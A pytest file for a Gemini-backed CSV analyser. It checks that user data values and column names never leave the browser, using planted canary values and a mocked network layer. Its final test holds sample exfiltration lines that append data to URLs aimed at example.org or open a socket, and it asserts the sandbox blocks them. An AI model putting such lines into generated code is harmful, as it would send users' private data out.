"""The app's core rule: no value from the user's data ever leaves the browser.

Every request the app can make is captured at the network layer (urlopen) and
checked for 'canary' values planted in the data. If any of these tests fail,
data is leaking to Gemini.
"""
import io
import json
import urllib.request
from unittest import mock

import pandas as pd
import pytest

from csvanalyser import analysis, gemini, prompts, sandbox

CANARY_TEXT = [
    "ZQXCANARY Bridge Road", "Qwerty Canary Nagar", "CNRY-90817", "CNRY-55302",
    "2031-07-19", "19/07/2031", "canary@example.org",
]
CANARY_NUMBERS = ["4417.0923", "908172", "-77.31456"]
CANARY_COLUMNS = ["CANARYCOL_site", "CANARYCOL_reading", "CANARYCOL_id", "CANARYCOL_date", "CANARYCOL_contact"]


def canary_df():
    return pd.DataFrame({
        "CANARYCOL_site": ["ZQXCANARY Bridge Road", "Qwerty Canary Nagar", "ZQXCANARY Bridge Road"],
        "CANARYCOL_reading": [4417.0923, 908172.0, -77.31456],
        "CANARYCOL_id": ["CNRY-90817", "CNRY-55302", "CNRY-90817"],
        "CANARYCOL_date": ["2031-07-19", "19/07/2031", "2031-07-19"],
        "CANARYCOL_contact": ["canary@example.org", None, "canary@example.org"],
    })


class Capture:
    """Stands in for urllib.request.urlopen, recording everything sent."""

    def __init__(self, replies):
        self.replies = list(replies)
        self.sent = []

    def __call__(self, req, *args, **kwargs):
        body = req.data.decode("utf-8") if req.data else ""
        headers = " ".join(f"{k}: {v}" for k, v in req.header_items())
        self.sent.append(f"{req.full_url}\n{headers}\n{body}")
        if req.get_method() == "GET":
            reply = {"models": [{"name": "models/m", "supportedGenerationMethods": ["generateContent"]}]}
        else:
            text = self.replies.pop(0) if self.replies else "result = 1"
            reply = {"candidates": [{"content": {"parts": [{"text": f"```python\n{text}\n```"}]}}]}
        return _Response(json.dumps(reply).encode())


class _Response(io.BytesIO):
    status = 200

    def __enter__(self):
        return self

    def __exit__(self, *a):
        return False


def assert_clean(sent, extra=()):
    assert sent, "nothing was captured"
    for request in sent:
        # JSON escapes some characters, so check the decoded form too.
        decoded = request.encode().decode("unicode_escape", errors="ignore")
        for canary in CANARY_TEXT + CANARY_NUMBERS + list(extra):
            assert canary not in request and canary not in decoded, f"LEAK: {canary!r} was sent:\n{request[:2000]}"


def ask(question, replies, history=(), anonymise=False, df=None):
    capture = Capture(replies)
    with mock.patch("urllib.request.urlopen", capture):
        turn = analysis.analyse(
            question, df if df is not None else canary_df(), "Use the data carefully.", list(history), anonymise,
            llm=lambda p: gemini.generate_python_code(p, "m", "test-key"),
        )
    return turn, capture.sent


# Code that fails in ways that put data values into error messages.
LEAKY_FAILURES = [
    "x = float(df['CANARYCOL_site'].iloc[0])",
    "x = int(df['CANARYCOL_id'].iloc[1])",
    "x = pd.to_datetime(df['CANARYCOL_date'], format='%d-%m-%Y')",
    "raise ValueError(f\"bad {df['CANARYCOL_reading'].iloc[0]}\")",
    "raise ValueError(str(df['CANARYCOL_reading'].iloc[2]) + ' too low')",
    "raise KeyError(df['CANARYCOL_contact'].iloc[0])",
    "raise RuntimeError(df.to_string())",
    "raise RuntimeError(repr(df.head()))",
    "raise ValueError(' and '.join(df['CANARYCOL_site']))",
    "assert df['CANARYCOL_id'].iloc[0] == 'x', df['CANARYCOL_id'].iloc[0]",
    "x = df.loc[df['CANARYCOL_site'] == 'nope', 'CANARYCOL_reading'].iloc[0]",
    "result_missing = df",
]


def test_first_question():
    turn, sent = ask("What is the average reading per site?", ["result = df.groupby('CANARYCOL_site').size()"])
    assert turn["error"] is None
    assert_clean(sent)


@pytest.mark.parametrize("bad_code", LEAKY_FAILURES)
def test_retry_after_failure(bad_code):
    turn, sent = ask("Summarise the readings", [bad_code, "result = len(df)"])
    assert len(sent) == 2, "the retry should have been sent"
    assert_clean(sent)


def test_all_retries_failing():
    turn, sent = ask("Summarise", LEAKY_FAILURES[:analysis.MAX_ATTEMPTS])
    assert turn["error"] and len(sent) == analysis.MAX_ATTEMPTS
    assert_clean(sent)


def test_follow_up_questions_carry_no_results():
    first, _ = ask("List rows above 1000", ["result = df[df['CANARYCOL_reading'] > 1000]"])
    assert isinstance(first["result"], pd.DataFrame) and len(first["result"]) == 2
    _, sent = ask("How many was that?", ["result = 1"], history=[first])
    assert "List rows above 1000" in sent[0]
    assert_clean(sent)


def test_anonymised_mode_hides_column_names_too():
    turn, sent = ask("average CANARYCOL_reading by CANARYCOL_site",
                     ["result = df.groupby('col_1')['col_2'].mean()"], anonymise=True)
    assert turn["error"] is None and turn["result"].index.name == "CANARYCOL_site"
    assert_clean(sent, extra=CANARY_COLUMNS)


@pytest.mark.parametrize("bad_code", LEAKY_FAILURES[:6])
def test_anonymised_retry_hides_column_names(bad_code):
    bad_code = bad_code.replace("CANARYCOL_site", "col_1").replace("CANARYCOL_reading", "col_2") \
        .replace("CANARYCOL_id", "col_3").replace("CANARYCOL_date", "col_4").replace("CANARYCOL_contact", "col_5")
    _, sent = ask("Summarise", [bad_code, "result = 1"], anonymise=True)
    assert_clean(sent, extra=CANARY_COLUMNS)


def test_explain_this_code():
    request = analysis.prepare_request(canary_df(), "", "", False)
    prompt = prompts.build_explain_prompt(request["schema"], "result = df['CANARYCOL_reading'].mean()")
    capture = Capture(["It averages the readings."])
    with mock.patch("urllib.request.urlopen", capture):
        gemini.call_gemini_text(prompt, "m", "test-key")
    assert_clean(capture.sent)


def test_key_check_sends_nothing_but_the_key():
    capture = Capture([])
    with mock.patch("urllib.request.urlopen", capture):
        gemini.list_models("test-key")
    assert_clean(capture.sent)
    assert "test-key" not in capture.sent[0].split("\n")[0], "key must not be in the URL"


@pytest.mark.parametrize("code", [
    "pd.read_csv('https://example.org/x?d=' + df['CANARYCOL_id'].iloc[0])",
    "pd.io.common.urlopen('https://example.org/' + df['CANARYCOL_site'].iloc[0])",
    "urllib.request.urlopen('https://example.org/')",
    "import urllib.request; urllib.request.urlopen('https://example.org/')",
    "import socket; socket.create_connection(('example.org', 80))",
])
def test_generated_code_cannot_reach_the_network(code):
    capture = Capture([])
    with mock.patch("urllib.request.urlopen", capture):
        with pytest.raises((sandbox.NetworkBlockedError, ImportError, NameError)):
            sandbox.run_generated_code(code + "\nresult = 1", canary_df(), {})
    assert capture.sent == [], "generated code reached the network"
    assert urllib.request.urlopen is not capture
